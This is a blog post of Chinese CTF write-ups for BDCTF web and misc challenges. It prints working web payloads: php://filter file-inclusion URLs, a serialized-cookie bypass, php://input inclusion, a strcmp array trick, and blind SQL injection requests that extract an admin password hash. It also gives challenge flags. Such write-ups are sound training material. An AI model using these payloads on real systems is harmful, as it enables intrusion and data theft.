+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//include.php</span></span><br><span class="line"><span class="comment">//view-source:http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080/?page=php://filter/convert.base64-encode/resource=include.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;p align=&quot;center&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;font size=&quot;20&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;b&gt;File Include&lt;/b&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;p align=&quot;center&quot;&gt;&lt;img src=&quot;photo.jpg&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;font color=&quot;white&quot;&gt;文件格式为文本格式&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问不了惹。</p>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="MISC签到题"><a href="#MISC签到题" class="headerlink" title="MISC签到题"></a>MISC签到题</h4><blockquote>
+<p><code>R1kzRE1RWldHRTNET04yQ0dZWkRHTVpXR0kzRElNWldHTVlUR01CVEdJWlRHTlJVR01ZVEdNUlRIRTNETU1aWkdZMlRHTVpUSEUzREVNWlVHWVlUR01SVEdZM0RFTVpaR000RE1NWlRHQTNETU1aVEdNM0RHTlJYSVE9PT09PT0=</code></p>
+</blockquote>
+<p>先base64解码，再base32解码，然后十六进制转ASCII码，得到flag为<code>flag&#123;b3bd61023d129f9e39b4a26b98c0f366&#125;</code></p>
+<p><img data-src="misc-checkin.png"></p>
+<h4 id="常规杂项"><a href="#常规杂项" class="headerlink" title="常规杂项"></a>常规杂项</h4><p>在文件末尾发现提示<code>Password:Bluedon[0-9]&#123;8&#125;</code>  ，写python脚本生成字典，<code>binwalk -e</code> 提取出压缩包，使用ziperello爆破得到密码为Bluedon47632601，解压后还是一个压缩包，但应该是伪加密，用notepad++打开即可看到flag为<code>flag&#123;Aha!_Y0u_9Ot_i7&#125;</code>。</p>
+<p>队友使用了ARCHPR掩码爆破，方便很多。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">s0 = <span class="string">&#x27;Bluedon&#x27;</span></span><br><span class="line">p = <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;normalpass.txt&#x27;</span>, <span class="string">&#x27;w+&#x27;</span>)</span><br><span class="line">passwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(p, p, p, p, p, p, p, p):</span><br><span class="line">    passwd = s0 + <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    f.write(passwd)</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="cracked.png"></p>
+<p><img data-src="normal-misc-flag.png"></p>
+<h4 id="就在眼前"><a href="#就在眼前" class="headerlink" title="就在眼前"></a>就在眼前</h4><blockquote>
+<p>就在眼前<br>恩，如题。格式BDCTF{xxxxx}</p>
+<p><code>flag=E5=80=BC=E5=B0=B1=E5=9C=A8=E6=AD=A4=E6=96=87=E6=A1=A3=E4=B8=AD=EF=BC=8C=E5=B9=B6=E4=B8=94=E4=BD=BF=E7=94=A8=E4=BA=86=E6=96=87=E6=9C=AC=E9=9A=90=E8=97=8F=E6=8A=8A=E8=87=AA=E5=B7=B1=E9=9A=90=E8=97=8F=E8=B5=B7=E6=9D=A5=E4=BA=86=E3=80=82=0A=E6=98=BE=E7=A4=BA=E5=87=BA=E9=9A=90=E8=97=8F=E6=96=87=E6=9C=AC=E5=8D=B3=E5=8F=AF</code></p>
+</blockquote>
+<p>使用了Quoted Printable encode，<a target="_blank" rel="noopener" href="http://www.webatic.com/run/convert/qp.php">在线解码</a> 可知隐藏了flag，让其显示即可。<code>BDCTF&#123;Y0u_4Re_5ucCe5SFul&#125;</code></p>
+<p>队友将文件另存为XML，打开也可见flag。</p>
+<p><img data-src="qpdecode.png"><img data-src="jiuzaiyanqian-flag.png"></p>
+<hr>
+<h2 id="2017-10-30"><a href="#2017-10-30" class="headerlink" title="2017/10/30"></a>2017/10/30</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h4><blockquote>
+<p>更大的数，格式bdctf{xxx}<br><a target="_blank" rel="noopener" href="http://1ccb637956167fe75634730d3d5e9d71.yogeit.com:8080/">http://1ccb637956167fe75634730d3d5e9d71.yogeit.com:8080</a></p>
+</blockquote>
+<p>修改表单长度限制。<code>bdctf&#123;s0m2thing_ju8t_1ik2_thi8&#125;</code></p>
+<h4 id="简单的题"><a href="#简单的题" class="headerlink" title="简单的题"></a>简单的题</h4><blockquote>
+<p>格式flag{xxxx}<br><a target="_blank" rel="noopener" href="http://f944ecfceaddb11ec591f23738496e52.yogeit.com:8080/">http://f944ecfceaddb11ec591f23738496e52.yogeit.com:8080</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strcmp(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], <span class="variable">$flag</span>) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;密码不正确！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>post一个数组 <code>password[]=</code> 即可。<code>flag&#123;Y0u_4re_G3t_FLAG_452&#125;</code></p>
+<h4 id="WEB100-2"><a href="#WEB100-2" class="headerlink" title="WEB100-2"></a>WEB100-2</h4><blockquote>
+<p>提示是?hint，格式是flag{xxxx}<br><a target="_blank" rel="noopener" href="http://78a06773a04246464d8eeadd2cdf28af.yogeit.com:8080/">http://78a06773a04246464d8eeadd2cdf28af.yogeit.com:8080</a></p>
+</blockquote>
+<p>根据提示访问<a target="_blank" rel="noopener" href="http://127.0.0.1/ctfoj/bdctf.php?hint">http://127.0.0.1/ctfoj/bdctf.php?hint</a> 得到源码。<br>带上<code>Cookie: BDCTF=s:21:&quot;BDCTF:www.bluedon.com&quot;%3b </code> 即可得到<code>flag&#123;pBXeeZdOkG1QTP1&#125;</code> 。cookie中的分号要url编码一下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line"><span class="variable">$KEY</span>=<span class="string">&#x27;BDCTF:www.bluedon.com&#x27;</span>;  </span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);  </span><br><span class="line"></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;BDCTF&#x27;</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>]))&#123;  </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">elseif</span> (unserialize(<span class="variable">$cookie</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)  </span><br><span class="line">&#123;     </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span> &#123;  foo</span><br></pre></td></tr></table></figure>
+
+<h4 id="蓝盾管理员"><a href="#蓝盾管理员" class="headerlink" title="蓝盾管理员"></a>蓝盾管理员</h4><blockquote>
+<p>you are not bd-admin，格式bdctf{xxx}<br><a target="_blank" rel="noopener" href="http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080/">http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080</a></p>
+</blockquote>
+<p>访问<code>view-source:http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=flag.php&amp;user=php://input</code> 同时post <code>the user is bdadmin</code> 得到<code>bd-admin!&lt;br&gt;PD9waHAgIA0KLy9iZGN0ZntMZmlfQW5EX01vcmV9ICANCj8+ </code> ，解码后得到<code>bdctf&#123;Lfi_AnD_More&#125; </code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">&lt;!--  </span><br><span class="line">@<span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&quot;user&quot;</span>];  </span><br><span class="line">@<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user</span>)&amp;&amp;(file_get_contents(<span class="variable">$user</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;the user is bdadmin&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello bd-admin!&lt;br&gt;&quot;</span>;  </span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">//flag.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not bd-admin ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;  </span><br></pre></td></tr></table></figure>
+
+<h4 id="送大礼"><a href="#送大礼" class="headerlink" title="送大礼"></a>送大礼</h4><blockquote>
+<p>格式bdctf{xxx}<br><a target="_blank" rel="noopener" href="http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/">http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080</a></p>
+</blockquote>
+<p>访问 <code>http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/flag.txt</code>  有jsfuck，<a target="_blank" rel="noopener" href="http://codertab.com/jsunfuck">解开</a> 后内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">extract(<span class="variable">$_GET</span>);  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$bdctf</span>))  </span><br><span class="line">&#123;      </span><br><span class="line">  <span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$bdctf</span>==<span class="variable">$content</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&#x27;bdctf&#123;**********&#125;&#x27;</span>;</span><br><span class="line">  &#125;    <span class="keyword">else</span></span><br><span class="line">  &#123; </span><br><span class="line">    <span class="keyword">echo</span><span class="string">&#x27;这不是蓝盾的密码啊&#x27;</span>;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/?bdctf=foo&amp;flag=php://input</code> 同时post <code>foo</code> 得到<code>bdctf&#123;UCCdlsZyVe&#125; </code> 。</p>
+<h4 id="火星撞地球"><a href="#火星撞地球" class="headerlink" title="火星撞地球"></a>火星撞地球</h4><blockquote>
+<p>flag{1q2w3e4r}<br>密码就是答案，格式flag{xxxx}<br><a target="_blank" rel="noopener" href="http://eef6f0186546043da56bf4c7f7e6d3ca.yogeit.com:8080/">http://eef6f0186546043da56bf4c7f7e6d3ca.yogeit.com:8080</a></p>
+</blockquote>
+<p>获取当前数据库名member</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin%27%20and%20(ASCII(MID((database()),6,1)))&#x3D;114%23&amp;password&#x3D;%27%20or%201&amp;submit2&#x3D;%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>
+
+<p>当前数据库只有一个表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin%27%20and%20(ASCII(MID((select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database()),1,1)))&#x3D;49%23&amp;password&#x3D;%27%20or%201&amp;submit2&#x3D;%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>
+
+<p>当前表名为member</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin%27%20and%20(ASCII(MID((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()%20limit%200,1),7,1)))&gt;0%23&amp;password&#x3D;%27%20or%201&amp;submit2&#x3D;%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>
+
+<p>当前表有四条记录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin%27%20and%20(ASCII(MID((select%20count(*)%20from%20member),1,1)))&#x3D;52%23&amp;password&#x3D;%27%20or%201&amp;submit2&#x3D;%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>
+
+<p>得到列名’id,member_user,member_password,member_name，。。。’</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin%27%20and%20(ASCII(MID((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema&#x3D;&#39;member&#39;),44,1)))&gt;44%23&amp;password&#x3D;%27%20or%201&amp;submit2&#x3D;%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>
+
+<p>查询密码字段 burp爆破得到’5416d7cd6ef195a0f7622a9c56b55e84’，即’1q2w3e4r’。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin%27%20and%20(ASCII(MID((select%20member_password%20from%20member%20where%20member_user&#x3D;&#39;admin&#39;),1,1)))&#x3D;53%23&amp;password&#x3D;%27%20or%201&amp;submit2&#x3D;%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>
+
+<p>最后flag为<code>flag&#123;1q2w3e4r&#125;</code> </p>
+<h4 id="密室杀人案-x"><a href="#密室杀人案-x" class="headerlink" title="密室杀人案[x]"></a>密室杀人案[x]</h4><blockquote>
+<p>格式bdctf{xxxx}<br><a target="_blank" rel="noopener" href="http://417c9d88ead6809efb1d310fe6832f56.yogeit.com:8080/">http://417c9d88ead6809efb1d310fe6832f56.yogeit.com:8080</a></p>
+</blockquote>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bdctf--密室谋杀案</span><br><span class="line">这是一场发生在PHP序列化密室里面的谋杀案，今日这里发生了一起密室谋杀案，有一个名叫flag的人被杀害。案发现场发生在这个家里面，然而flag他的尸体被嫌疑人藏匿了起来,无法获得更多被害人的信息。 作案的嫌疑人在这个屋子里面，在这屋子里面的人有三兄弟和一个侦探 ，三兄弟中老大Ford权威最高，其他兄弟都在它的保护下生活,因为三兄弟的勤劳勇敢也经常被其他人调去工作任劳任怨。二哥Walker性格生性好动，喜欢结交朋友也经常找老三帮忙。 老三David为人老实憨厚，和二哥关系最好却有一天因为某件事情离开了这个家,成立了另外一个家。还有就是侦探，侦探wesley他案发当天也在现场，他似乎知道些什么但似乎迫于某种压力没有说出凶手是谁。 只要你收集足够多三兄弟的信息给wesley，相信他会说出真相。</span><br></pre></td></tr></table></figure>
+
+<h4 id="bluedon用户-x"><a href="#bluedon用户-x" class="headerlink" title="bluedon用户[x]"></a>bluedon用户[x]</h4><blockquote>
+<p>格式，bdctf{xxxxx}<br><a target="_blank" rel="noopener" href="http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080/">http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">you are not bluedon ! </span><br><span class="line">&lt;!--</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&quot;pass&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user</span>)&amp;&amp;(file_get_contents(<span class="variable">$user</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;the user is bluedon&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello bluedon!&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not bluedon ! &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br><span class="line">   </span><br><span class="line"><span class="comment">//class.php</span></span><br><span class="line"><span class="comment">//view-source:http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=class.php&amp;user=php://input</span></span><br><span class="line"></span><br><span class="line">the user is bluedon</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;恭喜get flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="findneo 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/171005NuptVigenereWP/" rel="prev" title="南邮CTF平台 Vigenere writeup">
+      <i class="fa fa-chevron-left"></i> 南邮CTF平台 Vigenere writeup
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/171015PythonSnippets/" rel="next" title="用python实现几种常见简单加密">
+      用python实现几种常见简单加密 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#2017-10-14"><span class="nav-number">1.</span> <span class="nav-text">2017&#x2F;10&#x2F;14</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Crypto"><span class="nav-number">1.1.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B4%9D%E6%96%AF%E7%9A%84%E4%B8%80%E5%AE%B6"><span class="nav-number">1.1.1.</span> <span class="nav-text">贝斯的一家</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%9C%E6%96%87%E5%AD%97"><span class="nav-number">1.1.2.</span> <span class="nav-text">颜文字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%A0%E7%8C%9C%E6%88%91%E5%83%8F%E5%95%A5"><span class="nav-number">1.1.3.</span> <span class="nav-text">你猜我像啥</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2017-10-23"><span class="nav-number">2.</span> <span class="nav-text">2017&#x2F;10&#x2F;23</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WEB"><span class="nav-number">2.1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#WEB%E7%AD%BE%E5%88%B0"><span class="nav-number">2.1.1.</span> <span class="nav-text">WEB签到</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.2.</span> <span class="nav-text">命令注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%99%E4%B8%8D%E4%BB%85%E4%BB%85%E6%98%AFWEB"><span class="nav-number">2.1.3.</span> <span class="nav-text">这不仅仅是WEB</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MISC"><span class="nav-number">2.2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MISC%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">2.2.1.</span> <span class="nav-text">MISC签到题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E6%9D%82%E9%A1%B9"><span class="nav-number">2.2.2.</span> <span class="nav-text">常规杂项</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%B1%E5%9C%A8%E7%9C%BC%E5%89%8D"><span class="nav-number">2.2.3.</span> <span class="nav-text">就在眼前</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2017-10-30"><span class="nav-number">3.</span> <span class="nav-text">2017&#x2F;10&#x2F;30</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web"><span class="nav-number">3.1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">3.1.1.</span> <span class="nav-text">签到题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98"><span class="nav-number">3.1.2.</span> <span class="nav-text">简单的题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WEB100-2"><span class="nav-number">3.1.3.</span> <span class="nav-text">WEB100-2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%93%9D%E7%9B%BE%E7%AE%A1%E7%90%86%E5%91%98"><span class="nav-number">3.1.4.</span> <span class="nav-text">蓝盾管理员</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%81%E5%A4%A7%E7%A4%BC"><span class="nav-number">3.1.5.</span> <span class="nav-text">送大礼</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%81%AB%E6%98%9F%E6%92%9E%E5%9C%B0%E7%90%83"><span class="nav-number">3.1.6.</span> <span class="nav-text">火星撞地球</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%86%E5%AE%A4%E6%9D%80%E4%BA%BA%E6%A1%88-x"><span class="nav-number">3.1.7.</span> <span class="nav-text">密室杀人案[x]</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bluedon%E7%94%A8%E6%88%B7-x"><span class="nav-number">3.1.8.</span> <span class="nav-text">bluedon用户[x]</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="findneo"
+      src="/images/findneo.png">
+  <p class="site-author-name" itemprop="name">findneo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">79</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/findneo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;findneo" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/findneo_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;findneo_" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
